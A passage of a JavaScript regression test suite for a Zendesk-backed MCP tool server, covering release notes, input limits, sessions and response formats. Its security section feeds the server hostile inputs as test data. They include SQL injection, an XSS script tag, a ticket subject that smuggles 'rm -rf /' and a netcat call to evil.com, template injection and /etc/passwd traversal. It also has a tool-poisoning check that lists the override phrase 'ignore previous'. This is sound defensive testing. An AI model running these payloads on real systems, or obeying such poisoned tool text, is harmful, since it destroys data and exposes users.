    if (!state.sectionId) { skip('US template', 'no section'); return; }
    const md = [
      '### Functionality 1 Name', 'Alpha Feature',
      '### Functionality 1 Description', 'First feature for US template test.',
      '### Functionality 2 Name', 'Beta Feature',
      '### Functionality 2 Description', 'Second feature for US template test.',
      '### Functionality 3 Name', 'Gamma Feature',
      '### Functionality 3 Description', 'Third feature for US template test.',
    ].join('\n');
    const resp = await callTool(session, 'create_release_note', {
      markdown_content: md, use_us_template: true, section_id: state.sectionId,
      permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(!isErrorResult(resp), getToolText(resp));
    const m = getToolText(resp).match(/\{[\s\S]+\}/);
    if (m) { usArticleId = JSON.parse(m[0]).article?.id; state.releaseNoteArticleIds.push(usArticleId); }
  });

  await test('US template: title includes "Main:" prefix', async () => {
    if (!usArticleId) { skip('US title', 'not created'); return; }
    const data = getToolJSON(await callTool(session, 'get_article', { id: usArticleId }));
    assertIncludes(data.article.title, 'New Release | Main:', 'US title');
  });

  await test('US template: title includes all feature names', async () => {
    if (!usArticleId) { skip('US features', 'not created'); return; }
    const title = getToolJSON(await callTool(session, 'get_article', { id: usArticleId })).article.title;
    assertIncludes(title, 'Alpha Feature', 'Alpha');
    assertIncludes(title, 'Beta Feature', 'Beta');
    assertIncludes(title, 'Gamma Feature', 'Gamma');
  });

  await test('US template: body has Labor Main section', async () => {
    if (!usArticleId) { skip('US labor', 'not created'); return; }
    const body = getToolJSON(await callTool(session, 'get_article', { id: usArticleId })).article.body;
    assertIncludes(body, 'Labor Main', 'Labor Main header');
  });

  await test('US template: body has Platform and General Improvements', async () => {
    if (!usArticleId) { skip('US sections', 'not created'); return; }
    const body = getToolJSON(await callTool(session, 'get_article', { id: usArticleId })).article.body;
    assertIncludes(body, 'Platform', 'Platform');
    assertIncludes(body, 'General Improvements', 'General Improvements');
  });

  await test('US template: body has all three feature descriptions', async () => {
    if (!usArticleId) { skip('US descs', 'not created'); return; }
    const body = getToolJSON(await callTool(session, 'get_article', { id: usArticleId })).article.body;
    assertIncludes(body, 'First feature for US template test', 'desc1');
    assertIncludes(body, 'Second feature for US template test', 'desc2');
    assertIncludes(body, 'Third feature for US template test', 'desc3');
  });

  await test('create_release_note: custom title overrides auto-generated', async () => {
    if (!state.sectionId) { skip('custom title', 'no section'); return; }
    const md = '### Functionality 1 Name\nOverride Test\n### Functionality 1 Description\nDesc.';
    const resp = await callTool(session, 'create_release_note', {
      markdown_content: md, section_id: state.sectionId,
      title: 'My Custom Title For Regression', permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(!isErrorResult(resp), getToolText(resp));
    const m = getToolText(resp).match(/\{[\s\S]+\}/);
    if (m) {
      const data = JSON.parse(m[0]);
      assert(data.article?.title === 'My Custom Title For Regression', `title: ${data.article?.title}`);
      state.releaseNoteArticleIds.push(data.article?.id);
    }
  });

  await test('create_release_note: multiline description has <br> tags', async () => {
    if (!state.sectionId) { skip('multiline', 'no section'); return; }
    const md = '### Functionality 1 Name\nMultiline Test\n### Functionality 1 Description\nLine A.\nLine B.\nLine C.';
    const resp = await callTool(session, 'create_release_note', {
      markdown_content: md, section_id: state.sectionId, permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(!isErrorResult(resp), getToolText(resp));
    const m = getToolText(resp).match(/\{[\s\S]+\}/);
    if (m) {
      const id = JSON.parse(m[0]).article?.id;
      state.releaseNoteArticleIds.push(id);
      if (id) {
        const body = getToolJSON(await callTool(session, 'get_article', { id })).article.body;
        assertIncludes(body, 'Line A.<br>Line B.', '<br> conversion');
      }
    }
  });

  await test('create_release_note: Unicode in feature name works', async () => {
    if (!state.sectionId) { skip('unicode feature', 'no section'); return; }
    const md = '### Functionality 1 Name\nCafé Résumé Feature — naïve\n### Functionality 1 Description\nUnicode description with accents.';
    const resp = await callTool(session, 'create_release_note', {
      markdown_content: md, section_id: state.sectionId, permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(!isErrorResult(resp), getToolText(resp));
    const m = getToolText(resp).match(/\{[\s\S]+\}/);
    if (m) {
      const id = JSON.parse(m[0]).article?.id;
      state.releaseNoteArticleIds.push(id);
    }
  });

  // =========================================================================
  // SECTION 9: INPUT VALIDATION & BOUNDARY TESTING
  // =========================================================================
  console.log('\n--- 9. Input Validation & Boundaries ---');

  await test('list_tickets: page=0 rejected', async () => {
    const resp = await callTool(session, 'list_tickets', { page: 0 });
    assert(hasAnyError(resp), 'expected error');
  });

  await test('list_tickets: negative page rejected', async () => {
    const resp = await callTool(session, 'list_tickets', { page: -1 });
    assert(hasAnyError(resp), 'expected error');
  });

  await test('list_articles: page=0 rejected', async () => {
    const resp = await callTool(session, 'list_articles', { page: 0 });
    assert(hasAnyError(resp), 'expected error');
  });

  await test('list_tickets: per_page=50 is accepted (mid-range boundary)', async () => {
    const resp = await callTool(session, 'list_tickets', { per_page: 50 });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('list_articles: per_page=50 is accepted (mid-range boundary)', async () => {
    const resp = await callTool(session, 'list_articles', { per_page: 50 });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('search: per_page=50 is accepted (mid-range boundary)', async () => {
    const resp = await callTool(session, 'search', { query: 'type:ticket', per_page: 50 });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('search: per_page=1 is accepted (min boundary)', async () => {
    const resp = await callTool(session, 'search', { query: 'type:ticket', per_page: 1 });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('search: exactly 1000 char query is accepted', async () => {
    const q = 'a'.repeat(1000);
    const resp = await callTool(session, 'search', { query: q, per_page: 1 });
    assert(!resp.error, 'should not error for exactly 1000 chars');
  });

  await test('create_ticket: subject at max 300 chars is accepted', async () => {
    const resp = await callTool(session, 'create_ticket', {
      subject: '[TEST] ' + 'x'.repeat(293),
      comment: 'Boundary test for subject length.',
    });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('create_ticket: subject over 300 chars is rejected', async () => {
    const resp = await callTool(session, 'create_ticket', {
      subject: 'x'.repeat(301),
      comment: 'Boundary test.',
    });
    assert(hasAnyError(resp), 'expected error');
  });

  // =========================================================================
  // SECTION 10: SECURITY TESTING
  // =========================================================================
  console.log('\n--- 10. Security Testing ---');

  await test('Security: SQL injection in search query is handled', async () => {
    const resp = await callTool(session, 'search', { query: "'; DROP TABLE tickets; --", per_page: 1 });
    assert(!resp.error, 'should not crash on SQL injection');
  });

  await test('Security: script tag in article body does not crash', async () => {
    if (!state.sectionId) { skip('xss body', 'no section'); return; }
    const resp = await callTool(session, 'create_article', {
      title: '[REGRESSION TEST] XSS test article',
      body: '<p>Normal text</p><script>alert("xss")</script><p>After script</p>',
      section_id: state.sectionId, draft: true, locale: 'en-us',
      permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(!resp.error, 'should not crash on script tags');
  });

  await test('Security: command injection chars in ticket subject', async () => {
    const resp = await callTool(session, 'create_ticket', {
      subject: '[TEST] `whoami` && rm -rf / | nc evil.com 4444',
      comment: 'Command injection test payload.',
    });
    assert(!resp.error, 'should not crash on shell metacharacters');
  });

  await test('Security: template injection in search', async () => {
    const resp = await callTool(session, 'search', { query: '${7*7} {{constructor.constructor}}', per_page: 1 });
    assert(!resp.error, 'should not crash on template injection');
  });

  await test('Security: path traversal in search', async () => {
    const resp = await callTool(session, 'search', { query: '../../../etc/passwd', per_page: 1 });
    assert(!resp.error, 'should not crash on path traversal');
  });

  await test('Security: error messages do not leak credentials', async () => {
    const resp = await callTool(session, 'get_ticket', { id: 999999999 });
    const text = getToolText(resp);
    assertNotIncludes(text, 'JI8x01N', 'API token leaked in error');
    assertNotIncludes(text, 'Basic ', 'auth header leaked in error');
    assertNotIncludes(text, 'Boyan.Asenov', 'email leaked in error');
  });

  await test('Security: error messages do not leak stack traces', async () => {
    const resp = await callTool(session, 'get_ticket', { id: 999999999 });
    const text = getToolText(resp);
    assertNotIncludes(text, '    at ', 'stack trace leaked');
    assertNotIncludes(text, 'node_modules', 'internal path leaked');
  });

  await test('Security: health endpoint does not expose sensitive config', async () => {
    const res = await httpGet('/health');
    assertNotIncludes(res.body, 'token', 'token in health');
    assertNotIncludes(res.body, 'password', 'password in health');
    assertNotIncludes(res.body, 'email', 'email in health');
    assertNotIncludes(res.body, 'ZENDESK_', 'env vars in health');
  });

  await test('Security: no tool poisoning in tool descriptions', async () => {
    const suspicious = [/ignore previous/i, /<system>/i, /\x1b\[/, /base64\.decode/i, /IMPORTANT:.*MUST/i];
    for (const tool of toolsList) {
      const text = JSON.stringify(tool);
      for (const pattern of suspicious) {
        assert(!pattern.test(text), `${tool.name}: suspicious pattern ${pattern}`);
      }
    }
  });

  await test('Security: no delete tools are registered', async () => {
    const names = toolsList.map(t => t.name);
    for (const name of names) {
      assert(!name.startsWith('delete_'), `delete tool registered: ${name}`);
    }
  });

  // =========================================================================
  // SECTION 11: ERROR HANDLING & RESILIENCE
  // =========================================================================
  console.log('\n--- 11. Error Handling & Resilience ---');

  await test('Non-existent tool name returns error', async () => {
    const resp = await callTool(session, 'does_not_exist_tool', {});
    assert(hasAnyError(resp), 'expected error');
  });

  await test('Error in one call does not break session (call after error)', async () => {
    await callTool(session, 'get_ticket', { id: 999999999 });
    const resp = await callTool(session, 'list_tickets', { per_page: 1 });
    assert(!isErrorResult(resp), 'session broken after error');
    const data = getToolJSON(resp);
    assertArray(data.tickets, 'tickets');
  });

  await test('Multiple sequential errors do not crash session', async () => {
    for (let i = 0; i < 5; i++) {
      await callTool(session, 'get_ticket', { id: 999999999 });
    }
    const resp = await callTool(session, 'list_tickets', { per_page: 1 });
    assert(!isErrorResult(resp), 'session crashed after 5 errors');
  });

  await test('JSON-RPC response id matches request id', async () => {
    const resp = await sendJsonRpc(session, 'tools/list', {});
    assertDefined(resp.id, 'response.id');
    assertType(resp.id, 'number', 'response.id');
  });

  await test('Unknown JSON-RPC method handled gracefully', async () => {
    const resp = await sendJsonRpc(session, 'nonexistent/method', {});
    assert(resp.error || (resp.result && resp.result.isError), 'expected error for unknown method');
  });

  // =========================================================================
  // SECTION 12: CONCURRENT SESSIONS & PERFORMANCE
  // =========================================================================
  console.log('\n--- 12. Concurrent Sessions & Performance ---');

  await test('Fresh session works after closing old one', async () => {
    const oldSid = session.sessionId;
    closeSSE(session);
    await new Promise(r => setTimeout(r, 500));
    session = await connectSSE();
    assert(session.sessionId !== oldSid, 'got same session id after reconnect');
    const resp = await listTools(session);
    assert(resp.result.tools.length === 10, `tools: ${resp.result.tools.length}`);
  });

  await test('Rapid sequential tool calls on same session (6 calls)', async () => {
    const results = [];
    for (let i = 0; i < 6; i++) {
      const resp = await callTool(session, 'list_tickets', { per_page: 1 });
      results.push(resp);
    }
    for (let i = 0; i < results.length; i++) {
      assert(!isErrorResult(results[i]), `call ${i} failed`);
    }
  });

  await test('Session reconnect preserves functionality', async () => {
    closeSSE(session);
    await new Promise(r => setTimeout(r, 500));
    session = await connectSSE();
    const r1 = await callTool(session, 'list_articles', { per_page: 1 });
    assert(!isErrorResult(r1), 'article call failed after reconnect');
    const r2 = await callTool(session, 'list_tickets', { per_page: 1 });
    assert(!isErrorResult(r2), 'ticket call failed after reconnect');
  });

  await test('Session handles interleaved read calls', async () => {
    const r1 = await callTool(session, 'list_tickets', { per_page: 1 });
    const r2 = await callTool(session, 'list_articles', { per_page: 1 });
    const r3 = await callTool(session, 'search', { query: 'type:ticket', per_page: 1 });
    const r4 = await callTool(session, 'list_tickets', { per_page: 2 });
    assert(!isErrorResult(r1), 'r1 failed');
    assert(!isErrorResult(r2), 'r2 failed');
    assert(!isErrorResult(r3), 'r3 failed');
    assert(!isErrorResult(r4), 'r4 failed');
  });

  // =========================================================================
  // SECTION 13: SEARCH CROSS-VALIDATION
  // =========================================================================
  console.log('\n--- 13. Search Cross-Validation ---');

  await test('search: find created test ticket by subject', async () => {
    if (!state.createdTicketId) { skip('search ticket', 'not created'); return; }
    await new Promise(r => setTimeout(r, 3000));
    const resp = await callTool(session, 'search', { query: 'type:ticket subject:"REGRESSION TEST" tags:mcp-test', per_page: 5 });
    assert(!isErrorResult(resp), getToolText(resp));
    const data = getToolJSON(resp);
    assertArray(data.results, 'results');
  });

  await test('search: sort_order parameter works', async () => {
    const respAsc = await callTool(session, 'search', { query: 'type:ticket', per_page: 2, sort_order: 'asc' });
    const respDesc = await callTool(session, 'search', { query: 'type:ticket', per_page: 2, sort_order: 'desc' });
    assert(!isErrorResult(respAsc), getToolText(respAsc));
    assert(!isErrorResult(respDesc), getToolText(respDesc));
  });

  await test('search: page parameter works for pagination', async () => {
    const resp1 = await callTool(session, 'search', { query: 'type:ticket', per_page: 1, page: 1 });
    const resp2 = await callTool(session, 'search', { query: 'type:ticket', per_page: 1, page: 2 });
    assert(!isErrorResult(resp1), getToolText(resp1));
    assert(!isErrorResult(resp2), getToolText(resp2));
    const d1 = getToolJSON(resp1);
    const d2 = getToolJSON(resp2);
    if (d1.results.length > 0 && d2.results.length > 0) {
      assert(d1.results[0].id !== d2.results[0].id, 'page 1 and 2 returned same result');
    }
  });

  // =========================================================================
  // SECTION 14: RESPONSE FORMAT VALIDATION
  // =========================================================================
  console.log('\n--- 14. Response Format Validation ---');

  await test('All tool responses have content array with text type', async () => {
    const testCases = [
      ['list_tickets', { per_page: 1 }],
      ['list_articles', { per_page: 1 }],
      ['search', { query: 'type:ticket', per_page: 1 }],
    ];
    for (const [name, args] of testCases) {
      const resp = await callTool(session, name, args);
      assertDefined(resp.result, `${name}: result`);
      assertArray(resp.result.content, `${name}: content`);
      assert(resp.result.content.length > 0, `${name}: content empty`);
      assert(resp.result.content[0].type === 'text', `${name}: content type = ${resp.result.content[0].type}`);
      assertType(resp.result.content[0].text, 'string', `${name}: text`);
    }
  });

  await test('Error responses have isError=true and text content', async () => {
    const errorCases = [
      ['get_ticket', { id: 999999999 }],
    ];
    for (const [name, args] of errorCases) {
      const resp = await callTool(session, name, args);
      assert(resp.result?.isError === true, `${name}: isError not true`);
      assertArray(resp.result.content, `${name}: error content`);
      assert(resp.result.content[0].type === 'text', `${name}: error content type`);
      assertType(resp.result.content[0].text, 'string', `${name}: error text`);
    }
  });

  await test('JSON-RPC responses have jsonrpc "2.0" field', async () => {
    const resp = await listTools(session);
    assert(resp.jsonrpc === '2.0', `jsonrpc = ${resp.jsonrpc}`);
  });

  await test('list_tickets response has pagination metadata', async () => {
    const resp = await callTool(session, 'list_tickets', { per_page: 1 });
    const data = getToolJSON(resp);
    assertDefined(data.tickets, 'tickets');
    // Zendesk responses include next_page, previous_page, count
    assertDefined(data.next_page !== undefined || data.count !== undefined, 'pagination metadata');
  });

  // =========================================================================
  // SECTION 15: SPECIAL CHARACTER HANDLING
  // =========================================================================
  console.log('\n--- 15. Special Character Handling ---');

  await test('Ticket with Unicode subject and comment', async () => {
    const resp = await callTool(session, 'create_ticket', {
      subject: '[TEST] Tëst Ünïcödé — naïve café résumé 日本語',
      comment: 'Unicode body: äöü ñ é ø Ω ∞ ≈ ≠ • ™ © ® 你好世界',
    });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('Ticket with newlines in comment', async () => {
    const resp = await callTool(session, 'create_ticket', {
      subject: '[TEST] Newline test',
      comment: 'Line 1\nLine 2\n\nLine 4 (after blank line)\n\tTabbed line',
    });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  await test('Article with complex HTML body', async () => {
    if (!state.sectionId) { skip('complex html', 'no section'); return; }
    const complexHtml = `
      <h2>Header Level 2</h2>
      <p>Paragraph with <strong>bold</strong>, <em>italic</em>, and <a href="https://example.com">link</a>.</p>
      <ul><li>Item 1</li><li>Item 2</li><li>Item 3</li></ul>
      <ol><li>Ordered 1</li><li>Ordered 2</li></ol>
      <table><tr><th>Col 1</th><th>Col 2</th></tr><tr><td>A</td><td>B</td></tr></table>
      <blockquote>A blockquote</blockquote>
      <pre><code>const x = 42;</code></pre>
    `.trim();
    const resp = await callTool(session, 'create_article', {
      title: '[REGRESSION TEST] Complex HTML body',
      body: complexHtml,
      section_id: state.sectionId, draft: true, locale: 'en-us',
      permission_group_id: PERMISSION_GROUP_ID,
    });
    assert(!isErrorResult(resp), getToolText(resp));
  });

  // =========================================================================
  // SUMMARY
  // =========================================================================

  closeSSE(session);

  const totalTime = timings.reduce((sum, t) => sum + t.elapsed, 0);
  const slowest = [...timings].sort((a, b) => b.elapsed - a.elapsed).slice(0, 5);

  console.log(`\n${'='.repeat(70)}`);
  console.log(`  RESULTS: \x1b[32m${passed} passed\x1b[0m, \x1b[31m${failed} failed\x1b[0m, \x1b[33m${skipped} skipped\x1b[0m`);
  console.log(`  Total time: ${(totalTime / 1000).toFixed(1)}s`);
  console.log(`${'='.repeat(70)}`);

  if (failures.length > 0) {
    console.log('\n  Failed tests:');
    for (const f of failures) {
      console.log(`    \x1b[31m✗\x1b[0m ${f.name}`);
      console.log(`      ${f.error}`);
    }
  }

  console.log('\n  Slowest 5 tests:');
  for (const t of slowest) {
    console.log(`    ${t.elapsed}ms — ${t.name}`);
  }

  const artifacts = [];
  if (state.createdTicketId) artifacts.push(`Ticket #${state.createdTicketId}`);
  if (state.createdArticleId) artifacts.push(`Article #${state.createdArticleId}`);
  for (const id of state.releaseNoteArticleIds.filter(Boolean)) {
    artifacts.push(`Release Note #${id}`);
  }
  if (artifacts.length > 0) {
    console.log(`\n  Test artifacts (safe to delete):`);
    artifacts.forEach(a => console.log(`    - ${a}`));
  }

  process.exit(failed > 0 ? 1 : 0);
}

main().catch((err) => {
  console.error('Fatal error:', err);
  process.exit(2);
});
